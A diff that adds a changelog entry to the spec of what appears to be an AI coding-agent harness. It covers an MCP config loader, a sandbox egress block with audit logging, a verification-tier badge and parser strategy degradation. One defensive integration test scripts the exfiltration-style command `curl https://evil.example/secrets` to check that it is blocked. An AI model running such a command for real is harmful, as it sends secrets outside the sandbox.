@@ -1,5 +1,71 @@
 # Atelier Spec — Changelog
 
+## v60.8 — 2026-05-18 (four-bundle release: §11 egress gate, §7 tier indicator, §15 mcp_servers loader, §1 conformance degradation)
+
+Second four-bundle parallel release in two days. Four sub-agent worktrees → four merges into main → one docs commit. Workspace tests **861 → 928** (+67). All gates green: `cargo fmt --check`, `cargo clippy --workspace -D warnings`, `cargo test --workspace`, `npm run check`, `make check` (112 rig tests, 13 canonical fixtures).
+
+### A3 — §15 mcp_servers.json loader + first-use approval store
+
+The rmcp-free config layer. Lands the schema-driven loader and the trust-budget approval store so the eventual rmcp client can plug into a settled surface.
+
+- New `crates/atelier-core/src/mcp_config.rs` (~890 lines including +23 unit tests): typed `McpServerManifest { name, transport, command, args, env, url, headers, side_effect_class, allow_net, enabled }`; `Transport::{Stdio, Http, Sse}`; `SideEffectClass::{LocalSafe, LocalRisky, SharedState, Irreversible}` (sibling to the dispatcher's enum — config-layer concerns vs trust-budget cost semantics evolve independently).
+- `pub fn load_mcp_servers(workspace_root) -> Result<Vec<McpServerManifest>, McpConfigError>`: reads `<workspace>/.atelier/mcp_servers.json`; absent file = empty vec (fresh-repo state, not an error); validates each entry against the embedded `schemas/config/mcp_servers.v1.json` via `jsonschema`; rejects duplicate names; filters out `enabled: false` entries before return.
+- `mcp_interpolate(s)` free function: resolves `${env:NAME}` from `std::env::var` at request time (not at load time, so secrets never persist into the parsed manifest); `${keychain:NAME}` returns `McpConfigError::KeychainNotYet` — explicit handoff to the future rmcp client.
+- `McpApprovals` (mirror of `HookApprovals`): per-server first-use trust-budget store at `<workspace>/.atelier/mcp_servers/_approvals.json`; methods `approve`, `is_approved`, `pending(loaded)`, `save`, `load`. Per spec §15 line 741 ("server registration is a §8 trust-budget event on first use"), approval is at the server level — granting trust to a server grants it to all that server's tools.
+
+### A1 — §11 sandbox egress mechanical gate
+
+Spec §11 + §12: a `shell` tool call attempting egress to a host outside the sandbox profile's allow-list is blocked AND audited.
+
+- Block mechanism (portable, dev-friendly): when the sandbox profile says `allow_net: false`, `subprocess::run` injects `http_proxy=http://127.0.0.1:1` / `https_proxy=http://127.0.0.1:1` into the child's environment. Any HTTP client inside the child (curl, wget, fetch) fails to connect to a closed loopback port. Linux namespaces are non-portable; macOS pf rules need sudo; the proxy approach is the realistic choice and is documented inline.
+- New `crates/atelier-core/src/audit.rs`: `EgressEvent { version, kind, tool_call_id, tool_name, destination, outcome, reason, timestamp }` per the new `schemas/audit/subprocess_egress.v1.json`. Newline-delimited JSON, one entry per line, persisted at `<workspace>/.atelier/sessions/<sid>/audit.log`.
+- Every built-in tool that launches a subprocess (`shell`, `grep`, `ast_grep`, `read_file`, `list_dir`, `write_file`, `edit_file`) now threads its `tool_call_id` into the subprocess layer so blocked-egress events carry the originating call in the audit trail.
+- Integration test `shell_curl_evil_example_is_blocked_and_audited` scripts a `shell` tool call attempting `curl https://evil.example/secrets`; asserts (a) non-zero exit + run reaches Done after later turn declares claimed_done, (b) audit.log contains exactly one `EgressEvent` JSON line referencing `evil.example` + `tc-curl-evil` tool_call_id + RFC 3339 timestamp, (c) `OnDiskSession::load_from` round-trips session.json validating the schema.
+
+### A2 — §7 UI tier indicator
+
+Visibility into verification coverage. When Tier 1 (LSP) is unavailable and the harness falls back to Tier 2 / Tier 3, the user sees the drop in a coloured footer badge rather than silently getting weaker checks.
+
+- New `VerificationTier` enum in `crates/atelier-core/src/verify.rs`: `Tier1Lsp` / `Tier2TreeSitter` / `Tier3Textual` / `NotRun` with `wire_label()` + serde `rename_all = "snake_case"`. Wire labels (`tier1_lsp`, `tier2_tree_sitter`, `tier3_textual`, `not_run`) pinned by an agreement test.
+- New `VerificationRun { tier, file_count, claim_count, discrepancies }` with `tier3_textual()` and `not_run()` constructors. Tier 1 is wire-reserved but has no producer (LSP work gated on Q3); Tier 2 producer wiring is a Phase D follow-on.
+- New `Event::VerificationPassed { tier, file_count, claim_count }` (kind `VerificationPassed`); `SessionDispatcher::verify_pass` runs Tier 3 textual + emits the event; `emit_verify_not_run` is the explicit "verification disabled" sentinel.
+- GUI MetersPane gains a colour-coded verify badge: green (Tier 1), yellow (Tier 2), orange (Tier 3), gray (NotRun). New `state.ts` types `VerificationTier` + `VerificationStatus` + `verificationTierLabel()` helper. TUI: `VerificationStatusHint` with `badge_label`/`badge_colour`, surfaced right-aligned on the cost row.
+- 13 new tests pin the wire-label agreement, the bridge, and the badge rendering.
+- **Known follow-on**: the dispatcher's `verify_pass` is **not yet called from `runner.rs`** — the Runner still transitions to `State::Verifying` without invoking it. Wiring the call site is a small follow-on; the doc + `emit_verify_not_run` sentinel make the absence explicit rather than silent.
+
+### A4 — §1 BYOM conformance-driven strategy degradation
+
+The runner walks the active §2 strategy toward more-tolerant forms when the rolling-window malformed-envelope rate crosses a threshold. PROVISIONAL defaults (3-of-20) — calibration row depends on Q1.
+
+- New constants in `crates/atelier-core/src/protocol_conformance.rs`: `DEFAULT_DEGRADATION_WINDOW: usize = 20` + `DEFAULT_DEGRADATION_THRESHOLD: u32 = 3`. `ProtocolConformance::should_degrade()` returns true when the rolling window has ≥ threshold malformed events out of ≥ window total.
+- `Strategy::less_tolerant_than` + degradation order (`NativeTool < JsonSentinel < RegexProse`). `Strategy::degrade_one_step` walks toward the more-tolerant end of the stack; degradation is one-way for the session (no auto-promotion).
+- Runner wiring: each turn's parse outcome feeds `conformance.record(...)`. When `should_degrade()` is true, the runner decrements the active strategy one step and emits `Event::StrategyDegraded { from, to, reason }`. `Runner::with_degradation_window(n)` + `with_degradation_threshold(t)` builders let integration tests dial the threshold down without queueing 20 mock responses.
+- New `Event::StrategyDegraded` (kind `StrategyDegraded`) on the bus; GUI bridge serialises `from`/`to` via `Strategy::as_str` ("native_tool" / "json_sentinel" / "regex_prose"); GUI `state.ts` `applyEvent` arm updates `currentModel.strategy` so the footer badge reflects the lowered tier. TUI's apply arm does the same on `current_model.strategy`.
+- Two new integration tests in `crates/atelier-cli/tests/run_integration.rs`:
+  - `run_degrades_strategy_after_three_malformed_envelopes_in_window`: 4-turn scripted MockAdapter with 3 malformed responses + one JSON-sentinel envelope; asserts exactly one `StrategyDegraded(NativeTool → JsonSentinel)` event fires.
+  - `run_does_not_emit_strategy_degraded_when_envelopes_are_clean`: pins the "no false positives" half — a clean envelope doesn't fire the degrade arm even with threshold dialled to 1.
+
+### Workspace test count delta
+
+- atelier-core unit: 675 → 729 (+54: +23 mcp_config + +7 verify + +6 audit + +18 protocol_conformance/strategy)
+- atelier-cli unit (lib): 39 → 39 (unchanged — A1/A2/A3/A4 added tests to atelier-core or integration suite)
+- atelier-cli integration: 37 → 40 (+3: 1 egress gate, 2 strategy degradation)
+- atelier-gui: 26 → 28 (+2: VerificationPassed bridge + StrategyDegraded bridge)
+- atelier-tui: 84 → 92 (+8: tier badge rendering + degradation apply arm)
+- Total: **861 → 928**
+
+### Cross-bundle merge resolution notes
+
+Branches forked from `109fc62` (v60.7 docs) and merged in order **A3 → A1 → A2 → A4**. A3 was fully isolated (zero conflicts). A1 + A2 merged cleanly via git's ort strategy (additive changes to disjoint sections). A4 collided with A2 on **five files**, all additive collisions on shared registries:
+
+- `session.rs::Event` enum + `kind()` match: keep both `VerificationPassed` (A2) + `StrategyDegraded` (A4).
+- `atelier-gui/src/lib.rs::bridge_event` match + tests: keep both arms.
+- `atelier-gui/ui/src/lib/state.ts` applyEvent + projectEvent arms: keep both cases.
+- `atelier-tui/src/lib.rs` apply + project_event arms: keep both.
+- `atelier-cli/tests/run_integration.rs`: the conflict here was structural — git auto-merged the shared `let runner = Runner::new(...)` scaffold INSIDE both test functions, producing a frankentest. Resolved by extracting each test cleanly from its source worktree and re-appending them in order.
+
+No semantic conflicts. The pattern is now well-established: bundles that touch the `Event` enum / `bridge_event` / `state.ts applyEvent` will always collide on those registries, but the resolution is always "keep both."
+
 ## v60.7 — 2026-05-18 (four-bundle release: §2 protocol overhead, Phase C close, §1 BYOM ledger, §14 persistence)
 
 Four bundles landed in parallel from separate sub-agent worktrees, then merged sequentially into main. Workspace tests **788 → 861** (+73). All gates green: `cargo fmt --check`, `cargo clippy --workspace -D warnings`, `cargo test --workspace`, `npm run check`, `make check` (11/11 canonical fixtures + 13 with new t12/t13, 112 rig tests).
